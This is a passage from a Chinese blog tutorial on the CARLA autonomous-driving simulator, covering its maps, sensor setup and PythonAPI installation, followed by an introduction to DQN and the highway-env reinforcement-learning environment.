米：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waypoint_list = <span class="built_in">map</span>.generate_waypoints(<span class="number">2.0</span>)</span><br></pre></td></tr></table></figure><p>要生成道路拓扑的最小图，请使用以下示例。 这将返回航点对（元组）的列表。 每对中的第一个元素与第二个元素连接，并且都定义了地图中每个车道的起点和终点。 有关此方法的更多信息，请参阅 PythonAPI。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waypoint_tuple_list = <span class="built_in">map</span>.get_topology()</span><br></pre></td></tr></table></figure><p>下面的示例以 carla.GeoLocation 的形式将 carla.Transform 转换为地理纬度和经度坐标：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_geolocation = <span class="built_in">map</span>.transform_to_geolocation(vehicle.transform)</span><br></pre></td></tr></table></figure><p>使用以下示例将 OpenDRIVE 格式的道路信息保存到磁盘：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info_map = <span class="built_in">map</span>.to_opendrive()</span><br></pre></td></tr></table></figure><h3 id="2-8-CARLA中的地图"><a href="#2-8-CARLA中的地图" class="headerlink" title="2.8 CARLA中的地图"></a>2.8 CARLA中的地图</h3><p>CARLA 有8个城镇，每个城镇有2种地图，即非分层地图和分层地图（后缀_Opt）。图层包含这些分组：</p><ul><li>NONE 无</li><li>Buildings 建筑</li><li>Decals 贴花</li><li>Foliage 植被</li><li>Ground 地面</li><li>ParkedVehicles 停靠的车辆</li><li>Particles 粒子</li><li>Props 杂物</li><li>StreetLights 路灯</li><li>Walls 墙体</li><li>All 所有</li></ul><h4 id="2-8-1-非分层地图"><a href="#2-8-1-非分层地图" class="headerlink" title="2.8.1 非分层地图"></a>2.8.1 非分层地图</h4><p>非分层地图如下表所示（单击城镇名称可查看布局的俯视图）。 所有图层始终存在，并且无法在这些地图中打开或关闭。 在 CARLA 0.9.11 之前，这些是唯一可用的地图类型。</p><ul><li>Town01：基本城镇，T型路口</li><li>Town02：类似Town01，更小</li><li>Town03：复杂城镇，5车道路口，环路，坡道，隧道</li><li>Town04：高速路和小镇的循环道路</li><li>Town05：带有交叉路口和桥的格子小镇。每个方向有多条车道，适合验证变道</li><li>Town06：长高速路，出入匝道</li><li>Town07：乡村环境，道路狭窄，少信号灯</li><li>Town10：高清城市环境</li></ul><h4 id="2-8-2-分层地图"><a href="#2-8-2-分层地图" class="headerlink" title="2.8.2 分层地图"></a>2.8.2 分层地图</h4><p>分层地图的布局与非分层地图的布局相同，但可以关闭和打开地图的图层。 有一个不能关闭的最小布局，由道路、人行道、交通信号灯和交通标志组成。 分层地图可以通过后缀 _Opt 来标识，例如 Town01_Opt。 使用这些地图，可以通过 Python API 加载和卸载图层：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Load layerred map for Town01 with minimum layout plus buildings and parked vehicles</span></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">world = client.load_world(<span class="string">&#x27;Town01_Opt&#x27;</span>, carla.MapLayer.Buildings | carla.MapLayer.ParkedVehicles)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Toggle all buildings off</span></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">world.unload_map_layer(carla.MapLayer.Buildings)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Toggle all buildings on</span></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">world.load_map_layer(carla.MapLayer.Buildings)</span><br></pre></td></tr></table></figure><h4 id="2-8-3-自定义地图"><a href="#2-8-3-自定义地图" class="headerlink" title="2.8.3 自定义地图"></a>2.8.3 自定义地图</h4><p>CARLA 旨在为专业应用程序提供可扩展性和高度可定制性。 因此，除了 CARLA 中已经开箱即用的许多地图和资产外，还可以创建和导入新的地图、道路网络和资产，以在 CARLA 模拟中填充定制环境。官方文档中有详细的介绍。而大多数情况下暂时不需要用到，因此这里不多加赘述，可以到CARKA官网中查看详细教程。</p><h3 id="2-9-传感器与数据"><a href="#2-9-传感器与数据" class="headerlink" title="2.9  传感器与数据"></a>2.9  传感器与数据</h3><p>传感器是从周围环境中检索数据的actor，“参与者”。</p><p>carla.Sensor 类定义了一种特殊类型的actor，能够测量和流式传输数据。</p><ul><li>这是什么数据？ 根据传感器的类型，它变化很大。 所有类型的数据都继承自通用 carla.SensorData。</li><li>他们什么时候检索数据？ 在每个模拟步骤或注册某个事件时。 取决于传感器的类型。</li><li>他们如何检索数据？ 每个传感器都有一个listen() 方法来接收和管理数据。</li></ul><p>尽管存在差异，但所有传感器都以相似的方式使用。</p><h4 id="2-9-1-设置"><a href="#2-9-1-设置" class="headerlink" title="2.9.1 设置"></a>2.9.1 设置</h4><p>与其他所有参与者一样，找到蓝图并设置特定属性。 这在处理传感器时至关重要。 它们的属性将决定获得的结果。</p><p>以下示例设置仪表板高清摄像头。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Find the blueprint of the sensor.</span></span><br><span class="line">blueprint = world.get_blueprint_library().find(<span class="string">&#x27;sensor.camera.rgb&#x27;</span>)</span><br><span class="line"><span class="comment"># Modify the attributes of the blueprint to set image resolution and field of view.</span></span><br><span class="line">blueprint.set_attribute(<span class="string">&#x27;image_size_x&#x27;</span>, <span class="string">&#x27;1920&#x27;</span>)</span><br><span class="line">blueprint.set_attribute(<span class="string">&#x27;image_size_y&#x27;</span>, <span class="string">&#x27;1080&#x27;</span>)</span><br><span class="line">blueprint.set_attribute(<span class="string">&#x27;fov&#x27;</span>, <span class="string">&#x27;110&#x27;</span>)</span><br><span class="line"><span class="comment"># Set the time in seconds between sensor captures</span></span><br><span class="line">blueprint.set_attribute(<span class="string">&#x27;sensor_tick&#x27;</span>, <span class="string">&#x27;1.0&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-9-2-生成"><a href="#2-9-2-生成" class="headerlink" title="2.9.2 生成"></a>2.9.2 生成</h4><p>attach_to 和attachment_type 至关重要。 传感器应该连接到父参与者（通常是车辆）上，以跟随它并收集信息。 附件类型将确定其位置关于所述车辆的更新方式。</p><ul><li>刚性附加。 运动对其父位置非常严格。 这是从模拟中检索数据的正确附件。</li><li>弹性附加。 运动很平稳，加速和减速很少。 此附件仅推荐用于录制模拟视频。 移动是平滑的，并且在更新摄像机位置时避免了“跳跃”。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">transform = carla.Transform(carla.Location(x=<span class="number">0.8</span>, z=<span class="number">1.7</span>))</span><br><span class="line">sensor = world.spawn_actor(blueprint, transform, attach_to=my_vehicle)</span><br></pre></td></tr></table></figure><h4 id="2-9-3-监听"><a href="#2-9-3-监听" class="headerlink" title="2.9.3 监听"></a>2.9.3 监听</h4><p>每个传感器都有一个listen() 方法。 每次传感器检索数据时都会调用它。</p><p>参数回调是一个 lambda 函数。 它描述了传感器在检索数据时应该做什么。 这必须将检索的数据作为参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># do_something() will be call each time a new image is generated by the camera</span></span><br><span class="line"><span class="comment"># sensor.listen(lambda data: do_something(date))</span></span><br><span class="line">sensor.listen(<span class="keyword">lambda</span> image: image.save_to_disk(<span class="string">&#x27;./output/%06d.png&#x27;</span> % image.frame))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This collision sensor would print everytime a collision is detected</span></span><br><span class="line"><span class="comment"># def callback(event):</span></span><br><span class="line"><span class="comment">#     for actor_id in event:</span></span><br><span class="line"><span class="comment">#         vehicle = world_ref().get_actor(actor_id)</span></span><br><span class="line"><span class="comment">#         print(&#x27;Vehicle too close: %s&#x27; % vehicle.type_id)</span></span><br><span class="line"><span class="comment"># sensor02.listen(callback)</span></span><br></pre></td></tr></table></figure><h4 id="2-9-4-数据"><a href="#2-9-4-数据" class="headerlink" title="2.9.4 数据"></a>2.9.4 数据</h4><p>大多数传感器数据对象都具有将信息保存到磁盘的功能。 这将允许它在其他环境中使用。</p><p>传感器类型之间的传感器数据差异很大。 但是，它们总是带有一些基本信息的标记。</p><table><thead><tr><th>传感器数据属性</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><code>frame</code></td><td>int</td><td>进行测量时的帧数。</td></tr><tr><td><code>timestamp</code></td><td>double</td><td>自剧集开始以来以模拟秒为单位的测量时间戳。</td></tr><tr><td><code>transform</code></td><td>carla.Transform</td><td>测量时传感器的世界参考。</td></tr></tbody></table><p><strong>注意：is_listening 是传感器属性，用于启用和关闭数据侦听。sensor_tick 是蓝图属性，用于设置接收数据之间的仿真时间</strong></p><p>将以上的代码完成一下，就实现了 <strong>设置 rgb 相机参数 -&gt; 生成相机演员附加在车辆上 -&gt; 设置相机回调方法，将图像保存在磁盘上 -&gt; 调用 world.tick() 接收服务器数据</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Find the blueprint of the sensor</span></span><br><span class="line">camera_bp = world.get_blueprint_library().find(<span class="string">&#x27;sensor.camera.rgb&#x27;</span>)</span><br><span class="line"><span class="comment"># Modify the attributes of the blueprint to set image resolution and field of view</span></span><br><span class="line">camera_bp.set_attribute(<span class="string">&#x27;image_size_x&#x27;</span>, <span class="string">&#x27;1920&#x27;</span>)</span><br><span class="line">camera_bp.set_attribute(<span class="string">&#x27;image_size_y&#x27;</span>, <span class="string">&#x27;1080&#x27;</span>)</span><br><span class="line">camera_bp.set_attribute(<span class="string">&#x27;fov&#x27;</span>, <span class="string">&#x27;110&#x27;</span>)</span><br><span class="line"><span class="comment"># Set the time in seconds between sensor captures</span></span><br><span class="line">camera_bp.set_attribute(<span class="string">&#x27;sensor_tick&#x27;</span>, <span class="string">&#x27;1.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">camera_transform = carla.Transform(carla.Location(x=<span class="number">0.8</span>, z=<span class="number">1.7</span>))</span><br><span class="line">sensor = world.spawn_actor(camera_bp, camera_transform, attach_to=vehicle)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do_something() will be call each time a new image is generated by the camera</span></span><br><span class="line"><span class="comment"># sensor.listen(lambda data: do_something(date))</span></span><br><span class="line">sensor.listen(<span class="keyword">lambda</span> image: image.save_to_disk(<span class="string">&#x27;./output/%06d.png&#x27;</span> % image.frame))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This collision sensor would print everytime a collision is detected</span></span><br><span class="line"><span class="comment"># def callback(event):</span></span><br><span class="line"><span class="comment">#     for actor_id in event:</span></span><br><span class="line"><span class="comment">#         vehicle = world_ref().get_actor(actor_id)</span></span><br><span class="line"><span class="comment">#         print(&#x27;Vehicle too close: %s&#x27; % vehicle.type_id)</span></span><br><span class="line"><span class="comment"># sensor02.listen(callback)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Main loop</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># Tick the server</span></span><br><span class="line">    world.tick()</span><br><span class="line">    w_frame = world.get_snapshot().frame</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;World&#x27;s frame: %d&quot;</span> % w_frame)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="2-10-传感器的类型"><a href="#2-10-传感器的类型" class="headerlink" title="2.10 传感器的类型"></a>2.10 传感器的类型</h3><h4 id="2-10-1-摄像头"><a href="#2-10-1-摄像头" class="headerlink" title="2.10.1 摄像头"></a>2.10.1 摄像头</h4><p>从相机的角度拍摄世界。 对于返回 carla.Image 的相机，您可以使用帮助类 carla.ColorConverter 来修改图像类型以表示不同的信息。</p><ul><li>检索每个模拟步骤的数据。</li></ul><table><thead><tr><th>传感器</th><th>输出</th><th>概述</th></tr></thead><tbody><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#depth-camera">Depth</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaimage">carla.Image</a></td><td>在灰度图中渲染视场中元素的深度。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#rgb-camera">RGB</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaimage">carla.Image</a></td><td>提供对周围环境的清晰视野。 看起来像一张普通的现场照片。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#optical-flow-camera">Optical Flow</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaimage">carla.Image</a></td><td>渲染来自相机的每个像素的运动。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#semantic-segmentation-camera">Semantic segmentation</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaimage">carla.Image</a></td><td>根据标签以特定颜色渲染视野中的元素。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#instance-segmentation-camera">Instance segmentation</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaimage">carla.Image</a></td><td>根据标签和唯一的对象 ID 以特定颜色渲染视野中的元素。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#dvs-camera">DVS</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carladvseventarray">carla.DVSEventArray</a></td><td>作为事件流异步测量亮度强度的变化。</td></tr></tbody></table><h4 id="2-10-2-探测器"><a href="#2-10-2-探测器" class="headerlink" title="2.10.2 探测器"></a>2.10.2 探测器</h4><p>探测器，当传感器附加的物体触发特定事件时，检索数据：</p><table><thead><tr><th>传感器</th><th>输出</th><th>概述</th></tr></thead><tbody><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#collision-detector">Collision</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlacollisionevent">carla.CollisionEvent</a></td><td>检索其父actor和其他actor之间的碰撞。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#lane-invasion-detector">Lane invasion</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlalaneinvasionevent">carla.LaneInvasionEvent</a></td><td>在其父项越过车道标记时注册。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#obstacle-detector">Obstacle</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaobstacledetectionevent">carla.ObstacleDetectionEvent</a></td><td>检测到其父级之前可能存在的障碍。</td></tr></tbody></table><h4 id="2-10-3-其它"><a href="#2-10-3-其它" class="headerlink" title="2.10.3 其它"></a>2.10.3 其它</h4><p>不同的功能，例如导航、物理属性测量和场景的 2D&#x2F;3D 点图。</p><table><thead><tr><th>传感器</th><th>输出</th><th>概述</th></tr></thead><tbody><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#gnss-sensor">GNSS</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlagnssmeasurement">carla.GNSSMeasurement</a></td><td>检索传感器的地理位置。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#imu-sensor">IMU</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaimumeasurement">carla.IMUMeasurement</a></td><td>包括加速度计、陀螺仪和指南针。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#lidar-sensor">LIDAR</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlalidarmeasurement">carla.LidarMeasurement</a></td><td>旋转激光雷达。 生成一个 4D 点云，每个点的坐标和强度对周围环境进行建模。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#radar-sensor">Radar</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaradarmeasurement">carla.RadarMeasurement</a></td><td>2D 点图建模元素在视线内及其与传感器有关的运动。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#rss-sensor">RSS</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlarssresponse">carla.RssResponse</a></td><td>根据安全检查修改应用于车辆的控制器。 此传感器的工作方式与其他传感器不同，并且有专门的 RSS 文档。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#semantic-lidar-sensor">Semantic LIDAR</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlasemanticlidarmeasurement">carla.SemanticLidarMeasurement</a></td><td>旋转激光雷达。 生成具有有关实例和语义分割的额外信息的 3D 点云。</td></tr></tbody></table><ul><li><strong>Camera构建</strong></li></ul><p>与汽车类似，我们先创建蓝图，再定义位置，然后再选择我们想要的汽车安装上去。不过，这里的位置都是相对汽车中心点的位置（以米计量）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">camera_bp = blueprint_library.find(<span class="string">&#x27;sensor.camera.rgb&#x27;</span>)</span><br><span class="line">camera_transform = carla.Transform(carla.Location(x=<span class="number">1.5</span>, z=<span class="number">2.4</span>))</span><br><span class="line">camera = world.spawn_actor(camera_bp, camera_transform, attach_to=ego_vehicle)</span><br></pre></td></tr></table></figure><p>我们还要对相机定义它的callback function,定义每次仿真世界里传感器数据传回来后，我们要对它进行什么样的处理。在这个教程里我们只需要简单地将文件存在硬盘里。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">camera.listen(<span class="keyword">lambda</span> image: image.save_to_disk(os.path.join(output_path, <span class="string">&#x27;%06d.png&#x27;</span> % image.frame)))</span><br></pre></td></tr></table></figure><ul><li><strong>Lidar构建</strong></li></ul><p>Lidar可以设置的参数比较多，对Lidar模型不熟也没有关系，我在后面会另开文章详细介绍激光雷达模型，现在就知道我们设置了一些常用参数就好。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lidar_bp = blueprint_library.find(<span class="string">&#x27;sensor.lidar.ray_cast&#x27;</span>)</span><br><span class="line">lidar_bp.set_attribute(<span class="string">&#x27;channels&#x27;</span>, <span class="built_in">str</span>(<span class="number">32</span>))</span><br><span class="line">lidar_bp.set_attribute(<span class="string">&#x27;points_per_second&#x27;</span>, <span class="built_in">str</span>(<span class="number">90000</span>))</span><br><span class="line">lidar_bp.set_attribute(<span class="string">&#x27;rotation_frequency&#x27;</span>, <span class="built_in">str</span>(<span class="number">40</span>))</span><br><span class="line">lidar_bp.set_attribute(<span class="string">&#x27;range&#x27;</span>, <span class="built_in">str</span>(<span class="number">20</span>))</span><br></pre></td></tr></table></figure><p>接着把lidar放置在奔驰上, 定义它的callback function.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lidar_location = carla.Location(<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">lidar_rotation = carla.Rotation(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">lidar_transform = carla.Transform(lidar_location, lidar_rotation)</span><br><span class="line">lidar = world.spawn_actor(lidar_bp, lidar_transform, attach_to=ego_vehicle)</span><br><span class="line">lidar.listen(<span class="keyword">lambda</span> point_cloud: \</span><br><span class="line">            point_cloud.save_to_disk(os.path.join(output_path, <span class="string">&#x27;%06d.ply&#x27;</span> % point_cloud.frame</span><br></pre></td></tr></table></figure><h2 id="3-PythonAPI的使用"><a href="#3-PythonAPI的使用" class="headerlink" title="3. PythonAPI的使用"></a>3. PythonAPI的使用</h2><h4 id="3-1-配置默认库"><a href="#3-1-配置默认库" class="headerlink" title="3.1 配置默认库"></a>3.1 配置默认库</h4><p>我们之前虽然已经make好了Carla的PythonAPI, 但是并没有将它的库安装到我们默认的python3里，如果你查看carla自带的example, 会发现都要先进行以下操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sys.path.append(glob.glob(<span class="string">&#x27;../carla/dist/carla-*%d.%d-%s.egg&#x27;</span> % (</span><br><span class="line">        sys.version_info.major,</span><br><span class="line">        sys.version_info.minor,</span><br><span class="line">        <span class="string">&#x27;win-amd64&#x27;</span> <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;linux-x86_64&#x27;</span>))[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">import</span> carla</span><br></pre></td></tr></table></figure><p>在我们的代码中，也要这样做。当然有一劳永逸的方法。将Carla Library安装到你的python3.7里。这是我个人研究的方法，不一定都能成功。</p><p>最新版本的CARLA模拟器，可以直接pip install carla解决。</p><p>如果安装了旧版，需要按照以下步骤进行：</p><p>使用anaconda激活car环境，cd命令进入PythonAPI&#x2F;carla&#x2F;dist。运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unzip carla-0.9.13-py3.7-win-amd64.egg -d carla-0.9.13-py3.7-win-amd64</span><br><span class="line">cd carla-0.9.13-py3.7-win-amd64</span><br></pre></td></tr></table></figure><p>在同目录下建立一个setup.py，复制进入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> distutils.core <span class="keyword">import</span> setup</span><br><span class="line">setup(name=<span class="string">&#x27;carla&#x27;</span>,</span><br><span class="line">      version=<span class="string">&#x27;0.9.10&#x27;</span>, </span><br><span class="line">      py_modules=[<span class="string">&#x27;carla&#x27;</span>],</span><br><span class="line">      )</span><br></pre></td></tr></table></figure><p>最后通过pip命令安装进去。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -e carla-0.9.13-py3.7-win-amd64</span><br></pre></td></tr></table></figure><h3 id="3-2"><a href="#3-2" class="headerlink" title="3.2"></a>3.2</h3><p>我原本准备详细写写他提供的pythonAPI，但是他提供的实在是非常多，后期只能用到什么查什么，写什么。这里放个官方文档地址。<a href="https://zlhou-carla-doc-cn.readthedocs.io/zh/latest/python_api/">Python API 参考 - CARLA 模拟器 中文文档 (zlhou-carla-doc-cn.readthedocs.io)</a></p><h2 id="4-基于DQN的自动驾驶"><a href="#4-基于DQN的自动驾驶" class="headerlink" title="4. 基于DQN的自动驾驶"></a>4. 基于DQN的自动驾驶</h2><h3 id="4-1-DQN"><a href="#4-1-DQN" class="headerlink" title="4.1 DQN"></a>4.1 DQN</h3><p>DQN（Deep Q-Learning）可谓是深度强化学习（Deep Reinforcement Learning，DRL）的开山之作，是将深度学习与强化学习结合起来从而实现从感知（Perception）到动作（ Action ）的端对端（End-to-end）学习的一种全新的算法。由DeepMind在NIPS 2013上发表，后又在Nature 2015上提出改进版本。</p><p>DQN是DRL的其中一种算法，它要做的就是将卷积神经网络（CNN）和Q-Learning结合起来，CNN的输入是原始图像数据（作为状态State），输出则是每个动作Action对应的价值评估Value Function（Q值）。</p><p><img src="/.io//20170612220809641" alt="这里写图片描述"></p><p>创新点：</p><p>基于Q-Learning构造Loss Function（不算很新，过往使用线性和非线性函数拟合Q-Table时就是这样做）。<br>通过experience replay（经验池）解决相关性及非静态分布问题；<br>使用TargetNet解决稳定性问题。<br>优点：</p><p>算法通用性，可玩不同游戏；<br>End-to-End 训练方式；<br>可生产大量样本供监督学习。<br>缺点：</p><p>无法应用于连续动作控制；<br>只能处理只需短时记忆问题，无法处理需长时记忆问题（后续研究提出了使用LSTM等改进方法）；<br>CNN不一定收敛，需精良调参。</p><h3 id="4-2-DQN自动驾驶"><a href="#4-2-DQN自动驾驶" class="headerlink" title="4.2 DQN自动驾驶"></a>4.2 DQN自动驾驶</h3><p>这里我们用pytroch+gym实现一下来感受深度强化学习。pytorch的环境配置之前已经说过，这里不多加赘述。</p><h4 id="4-2-1-配置环境"><a href="#4-2-1-配置环境" class="headerlink" title="4.2.1 配置环境"></a>4.2.1 配置环境</h4><p>gym是用于开发和比较强化学习算法的工具包，在python中安装gym库和其中子场景都较为简便。</p><p>安装gym：pip install gym</p><p>安装自动驾驶模块，这里使用Edouard Leurent发布在github上的包highway-env（原链接）：pip install –user git+<a href="https://github.com/eleurent/highway-env">https://github.com/eleurent/highway-env</a></p><p>其中包含6个场景：</p><ul><li><p>高速公路——“highway-v0”</p></li><li><p>汇入——“merge-v0”</p></li><li><p>环岛——“roundabout-v0”</p></li><li><p>泊车——“parking-v0”</p></li><li><p>十字路口——“intersection-v0”</p></li><li><p>赛车道——“racetrack-v0”</p></li></ul><h4 id="4-2-2-实验环境"><a href="#4-2-2-实验环境" class="headerlink" title="4.2.2 实验环境"></a>4.2.2 实验环境</h4><p>安装好后即可在代码中进行实验（以高速公路场景为例）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">import</span> highway_env</span><br><span class="line">%matplotlib inline</span><br><span class="line"></span><br><span class="line">env = gym.make(<span class="string">&#x27;highway-v0&#x27;</span>)</span><br><span class="line">env.reset()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    action = env.action_type.actions_indexes[<span class="string">&quot;IDLE&quot;</span>]</span><br><span class="line">    obs, reward, done, info = env.step(action)</span><br><span class="line">    env.render()</span><br></pre></td></tr></table></figure><p>会出现这样的画面：</p><p><img src="/.io//image-20220719182153218.png" alt="image-20220719182153218"></p><p>可以看到这是上帝视角。绿色的就是我们可以用代码操控的车。这样的游戏相对简单，数据比较好处理，大家也比较容易理解。</p><p>env类有很多参数可以配置，具体可以参考在github上的原文档。</p><h4 id="4-2-3-数据处理"><a href="#4-2-3-数据处理" class="headerlink" title="4.2.3 数据处理"></a>4.2.3 数据处理</h4><p>(1)state<br>highway-env包中没有定义传感器，车辆所有的state (observations) 都从底层代码读取，节省了许多前期的工作量。根据文档介绍，state (ovservations) 有三种输出方式：Kinematics，Grayscale Image和Occupancy grid。</p><p>Kinematics</p><p>输出V*F的矩阵，V代表需要观测的车辆数量（包括ego vehicle本身），F代表需要统计的特征数量。<br>例：</p><p>Vehiclexyv_xv_y<br>ego-vehicle5.04.015.00<br>vehicle1-10.04.012.00<br>vehicle213.08.013.50<br>数据生成时会默认归一化，取值范围：[100, 100, 20, 20]，也可以设置ego vehicle以外的车辆属性是地图的绝对坐标还是对ego vehicle的相对坐标。</p><p>在定义环境时需要对特征的参数进行设定：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">config = \</span><br><span class="line">    &#123;</span><br><span class="line">    <span 